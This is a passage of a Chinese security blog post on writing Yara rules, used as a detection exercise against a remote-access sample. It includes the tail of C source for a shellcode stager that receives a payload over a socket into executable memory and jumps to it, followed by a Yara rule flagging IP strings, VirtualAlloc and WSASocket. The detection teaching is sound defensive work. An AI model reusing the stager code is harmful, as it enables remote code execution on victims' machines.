&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;recv error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> Fail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//分配空间，以接收真正载荷</span></span><br><span class="line">    <span class="type">char</span>* orig_buffer;</span><br><span class="line">    orig_buffer = (<span class="type">char</span>*)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, payloadLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="type">char</span>* buffer;</span><br><span class="line">    buffer = orig_buffer;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        ret = <span class="built_in">recv</span>(sock, buffer, payloadLen, <span class="number">0</span>);</span><br><span class="line">        buffer += ret;</span><br><span class="line">        payloadLen -= ret;</span><br><span class="line">    &#125; <span class="keyword">while</span> (ret &gt; <span class="number">0</span> &amp;&amp; payloadLen &gt; <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//传入参数，并执行载荷</span></span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov edi, sock;   <span class="comment">//sock 存放在edi中</span></span><br><span class="line">        jmp orig_buffer; <span class="comment">//执行权转移到 载荷中，不要指望它返回。如果想要它返回，修改量比较大，不如把这个地方做成个线程,监听端设置退出时ExitThread更方便</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//释放空间</span></span><br><span class="line">    <span class="built_in">VirtualFree</span>(orig_buffer, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">Fail:</span><br><span class="line">    <span class="built_in">closesocket</span>(sock);</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>代码不细说了，总体流程如下:</p>
+<p>(准备工作)隐藏窗口 —-&gt;   初始化 Windows 套接字协议 —-&gt;   创建一个win套接字连接 —-&gt; 初始化此连接(目的ip,port,ip协议等) —-&gt;</p>
+<p>(正式开始)接收一个代表payload长度的数据 —–&gt; 根据长度开辟对应的可读可写可执行的内存空间 —–&gt; 接收payload —-&gt;调用内联汇编jmp到shellcode开始执行 —-&gt; 执行完毕后释放空间</p>
+<h2 id="找出特征"><a href="#找出特征" class="headerlink" title="找出特征"></a>找出特征</h2><p>要使得误杀率低，就要尽可能的区分开正常的PE文件和病毒木马的特征</p>
+<p>我们不能只凭<strong>5A 4D</strong>，或者见到<strong>VirtualAlloc</strong>就杀，而是要找到他们之间的阶段关联性。比如，正常的程序可能会用<strong>VirtualAlloc</strong>开辟一片内存，但对于远控类型的木马，可能在<strong>VirtualAlloc</strong>之前会进行一次网络通信，并且把通信负载赋值给这片新开辟的内存空间。</p>
+<p>因为字符串常量存储在PE结构中的.rdata节，并且是以明文存储的，在这个样本里对IP进行正则匹配可以成为一个特征点</p>
+<h2 id="Yara编写"><a href="#Yara编写" class="headerlink" title="Yara编写"></a>Yara编写</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yara</span><br><span class="line">rule_str=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">rule detection_evil_simple</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    meta:</span></span><br><span class="line"><span class="string">        author = &quot;Lanb0&quot;</span></span><br><span class="line"><span class="string">        description = &quot;根据IP,导入表函数进行恶意远控的检测&quot;</span></span><br><span class="line"><span class="string">        date = &quot;2023-09-05&quot;</span></span><br><span class="line"><span class="string">    strings:</span></span><br><span class="line"><span class="string">        //匹配IP地址</span></span><br><span class="line"><span class="string">        $oc =/((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;/ </span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        //匹配VirtualAlloc</span></span><br><span class="line"><span class="string">        $evil_func_1=&quot;VirtualAlloc&quot;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        //匹配WSASocket</span></span><br><span class="line"><span class="string">        $evil_func_2=&quot;WSASocket&quot;</span></span><br><span class="line"><span class="string">    condition:</span></span><br><span class="line"><span class="string">        all of them</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">rule = yara.<span class="built_in">compile</span>(source=rule_str)</span><br><span class="line">matches = rule.<span class="keyword">match</span>(<span class="string">&quot;1.exe&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(matches)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里的误杀率其实挺高的，目前我还没有深入，包括PE结构还没有摸清。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://wustzhb.github.io">lanb0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://wustzhb.github.io/2023/08/28/[%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0]Yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0/">https://wustzhb.github.io/2023/08/28/[%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0]Yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://wustzhb.github.io" target="_blank">Lanb0's blog|一个默默无闻的网安爱好者</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a><a class="post-meta__tags" href="/tags/yara%E8%A7%84%E5%88%99/">yara规则</a></div><div class="post_share"><div class="social-share" data-image="/img/head.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/09/02/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E6%A2%B3%E7%90%86/" title="PE结构分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PE结构分析</div></div></a></div><div class="next-post pull-right"><a href="/2023/08/18/%5BJS%E4%B8%93%E9%A1%B9%E8%AE%AD%E7%BB%83%5DCCC-WP/" title="[JS专项训练]CCC WP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">[JS专项训练]CCC WP</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/08/12/%5B%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%5DMSF%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84Shellcode%E5%AD%A6%E4%B9%A0/" title="[免杀学习]MSF框架下的Shellcode分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-12</div><div class="title">[免杀学习]MSF框架下的Shellcode分析</div></div></a></div><div><a href="/2023/06/25/%5B%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%5D%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%88%9D%E6%8E%A2(%E4%B8%8A)/" title="[免杀学习]动态链接库初探(上)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-25</div><div class="title">[免杀学习]动态链接库初探(上)</div></div></a></div><div><a href="/2023/06/26/%5B%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%5D%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%88%9D%E6%8E%A2(%E4%B8%8B)/" title="[免杀学习]动态链接库初探(下)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-26</div><div class="title">[免杀学习]动态链接库初探(下)</div></div></a></div><div><a href="/2023/07/18/%5B%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%5D%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E6%89%AB%E6%8F%8F%E6%B5%85%E6%9E%90(%E4%B8%8A)/" title="[免杀学习]杀毒软件扫描浅析(上)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-18</div><div class="title">[免杀学习]杀毒软件扫描浅析(上)</div></div></a></div><div><a href="/2023/07/30/%5B%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%5D%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E6%89%AB%E6%8F%8F%E6%B5%85%E6%9E%90(%E4%B8%8B)/" title="[免杀学习]杀毒软件扫描浅析(下)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-30</div><div class="title">[免杀学习]杀毒软件扫描浅析(下)</div></div></a></div><div><a href="/2023/08/01/%5B%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%5D%E7%BD%91%E7%BB%9C%E6%9F%A5%E6%9D%80%E4%B8%8E%E8%A7%84%E9%81%BF/" title="[免杀学习]网络查杀与规避"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-01</div><div class="title">[免杀学习]网络查杀与规避</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">lanb0</div><div class="author-info__description">充实地过好每一天</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">46</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">25</div></a></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://qm.qq.com/cgi-bin/qm/qr?k=Ga7oV2UM08biI8VudKTeFcEdzYPbbXdz&amp;noverify=0&amp;personal_qrcode_source=4" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">没什么大事要宣布的</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Yara%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">Yara简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Yara%E7%BC%96%E5%86%99-x2F-%E4%BD%BF%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">Yara编写&#x2F;使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98"><span class="toc-number">2.1.</span> <span class="toc-text">编码问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95-x2F-%E4%BF%AE%E9%A5%B0%E7%AC%A6%E6%80%BB%E7%BB%93"><span class="toc-number">2.2.</span> <span class="toc-text">语法&#x2F;修饰符总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#strings%E5%9D%97"><span class="toc-number">2.2.1.</span> <span class="toc-text">strings块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#condition%E5%9D%97"><span class="toc-number">2.2.2.</span> <span class="toc-text">condition块</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#uint"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">uint</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.2.2.2.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#filesize"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">filesize</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#of"><span class="toc-number">2.2.2.4.</span> <span class="toc-text">of</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#not"><span class="toc-number">2.2.2.5.</span> <span class="toc-text">not</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#and"><span class="toc-number">2.2.2.6.</span> <span class="toc-text">and</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#or"><span class="toc-number">2.2.2.7.</span> <span class="toc-text">or</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-1"><span class="toc-number">2.2.2.8.</span> <span class="toc-text">*</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%93"><span class="toc-number">2.3.</span> <span class="toc-text">库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84PE%E5%BA%93%E5%87%BD%E6%95%B0"><span class="toc-number">2.3.1.</span> <span class="toc-text">一些常用的PE库函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%AD%E7%BB%83-%E7%94%A8Yara%E8%A7%84%E5%88%99%E5%86%99%E4%B8%80%E4%B8%AA%E8%BF%9C%E6%8E%A7%E6%A3%80%E6%B5%8B"><span class="toc-number">3.</span> <span class="toc-text">训练:用Yara规则写一个远控检测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B7%E6%9C%AC%E6%BA%90%E7%A0%81"><span class="toc-number">3.1.</span> <span class="toc-text">样本源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%BE%E5%87%BA%E7%89%B9%E5%BE%81"><span class="toc-number">3.2.</span> <span class="toc-text">找出特征</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Yara%E7%BC%96%E5%86%99"><span class="toc-number">3.3.</span> <span class="toc-text">Yara编写</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/23/%5BJS%E4%B8%93%E9%A1%B9%E8%AE%AD%E7%BB%83%5DFile%20Library/" title="[JS专项训练]File Library WP">[JS专项训练]File Library WP</a><time datetime="2023-09-23T10:01:00.000Z" title="发表于 2023-09-23 18:01:00">2023-09-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/02/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E6%A2%B3%E7%90%86/" title="PE结构分析">PE结构分析</a><time datetime="2023-09-02T04:32:00.000Z" title="发表于 2023-09-02 12:32:00">2023-09-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/08/28/%5B%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%5DYara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0/" title="[免杀学习]Yara规则学习">[免杀学习]Yara规则学习</a><time datetime="2023-08-28T04:41:00.000Z" title="发表于 2023-08-28 12:41:00">2023-08-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/08/18/%5BJS%E4%B8%93%E9%A1%B9%E8%AE%AD%E7%BB%83%5DCCC-WP/" title="[JS专项训练]CCC WP">[JS专项训练]CCC WP</a><time datetime="2023-08-18T05:43:00.000Z" title="发表于 2023-08-18 13:43:00">2023-08-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/08/18/%5BJS%E4%B8%93%E9%A1%B9%E8%AE%AD%E7%BB%83%5Dblitzprop%20WP/" title="[JS专项训练]blitzprop WP">[JS专项训练]blitzprop WP</a><time datetime="2023-08-18T05:43:00.000Z" title="发表于 2023-08-18 13:43:00">2023-08-18</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/index_img.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 By lanb0</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">欢迎来到lanb0的博客</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script></div></body></html>
